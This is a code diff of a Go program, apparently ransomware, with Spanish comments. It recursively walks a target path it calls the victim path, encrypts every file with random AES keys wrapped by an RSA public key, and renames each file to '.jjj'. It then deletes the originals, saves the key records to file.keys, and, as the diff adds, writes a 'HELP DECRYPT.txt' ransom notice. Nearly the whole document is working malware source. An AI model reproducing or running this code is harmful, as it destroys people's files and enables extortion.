@@ -1,4 +1,3 @@
-// client/main.go
 package main
 
 import (
@@ -21,9 +20,8 @@ import (
 type EncryptionInfo struct {
 	Path    string `json:"path"`
 	Key     []byte `json:"key"`
-	OrigExt string `json:"orig_ext,omitempty"` // Almacena la extensión original (ej. ".txt")
+	OrigExt string `json:"orig_ext,omitempty"`
 }
-
 
 type EncryptionInfos []EncryptionInfo
 
@@ -60,39 +58,32 @@ func init() {
 }
 
 func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
-	// Generar una clave simétrica aleatoria
 	k := make([]byte, 16)
 	if _, err := rand.Read(k); err != nil {
 		log.Fatal(err)
 	}
 
-	// Crear el bloque AES con la clave generada
 	blk, err := aes.NewCipher(k)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	// Aplicar padding PKCS7 al mensaje
 	bs = pad(bs, blk.BlockSize())
 
-	// Generar un IV aleatorio
 	iv := make([]byte, blk.BlockSize())
 	if _, err := rand.Read(iv); err != nil {
 		log.Fatal(err)
 	}
 
-	// Encriptar usando CBC con el IV
 	enc := cipher.NewCBCEncrypter(blk, iv)
 	enc.CryptBlocks(bs, bs)
 
-	// Encriptar la clave simétrica usando RSA OAEP
 	ek, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaKey, k, nil)
 	if err != nil {
 		log.Fatal(err)
 	}
 	zero(k)
 
-	// Concatena el IV al principio del ciphertext para poder recuperarlo durante la desencriptación
 	ciphertext := append(iv, bs...)
 	return ek, ciphertext
 }
@@ -121,28 +112,23 @@ func zero(bs []byte) {
 }
 
 func main() {
-	// ✅ Verifica si se proporcionó un argumento
 	if len(os.Args) < 2 {
 		fmt.Println("Usage: go run main.go <path to encrypt>")
 		os.Exit(1)
 	}
 
-	// ✅ Toma el path correctamente
 	victim_path := os.Args[1]
 
-	// ✅ Confirma que el path existe
 	_, err := os.Stat(victim_path)
 	if os.IsNotExist(err) {
 		log.Fatal("Error: La ruta especificada no existe ->", victim_path)
 	}
 
-	// ✅ Procesa los archivos en la ruta
 	err = filepath.Walk(victim_path, walker)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	// ✅ Guarda `file.keys` correctamente
 	fata, _ := json.Marshal(eis)
 	err = os.WriteFile("file.keys", fata, 0666)
 	if err != nil {
@@ -150,6 +136,9 @@ func main() {
 	} else {
 		fmt.Println("✅ file.keys guardado correctamente.")
 	}
+
+	// ✅ Crear archivo de advertencia
+	createWarningFile()
 }
 
 func walker(path string, info os.FileInfo, err error) error {
@@ -163,36 +152,44 @@ func walker(path string, info os.FileInfo, err error) error {
 	}
 	log.Println(path, "(f)")
 	
-	// Leer el contenido original
 	bs, err := os.ReadFile(path)
 	if err != nil {
 		log.Println("Error al leer el archivo:", path, err)
 		return err
 	}
 	
-	// Encriptar el contenido
 	cbs, k := encryptHybrid(clientKey, bs)
 
-	// Extraer la extensión original y obtener el nombre base
 	ext := filepath.Ext(path)
 	base := strings.TrimSuffix(path, ext)
-	newPath := base + ".jjj" // Se elimina la extensión original y se agrega ".jjj"
+	newPath := base + ".jjj"
 
-	// Escribir el archivo encriptado
 	err = os.WriteFile(newPath, cbs, 0666)
 	if err != nil {
 		log.Println("Error al escribir el archivo encriptado:", newPath, err)
 		return err
 	}
-	// Guardar la información junto con la extensión original
+
 	eis = append(eis, EncryptionInfo{Path: newPath, Key: k, OrigExt: ext})
 
-	// Eliminar el archivo original
 	err = os.Remove(path)
 	if err != nil {
 		log.Println("Error al eliminar el archivo original:", path, err)
 		return err
 	}
 	return nil
+}
 
+func createWarningFile() {
+	message := `Tus archivos han sido encriptados.
+Para recuperar tus archivos, necesitas la clave privada correspondiente.
+Guarda este archivo como referencia.
+`
+
+	err := os.WriteFile("HELP DECRYPT.txt", []byte(message), 0666)
+	if err != nil {
+		log.Fatal("Error al escribir warning.txt:", err)
+	} else {
+		fmt.Println("✅ warning.txt guardado correctamente.")
+	}
 }
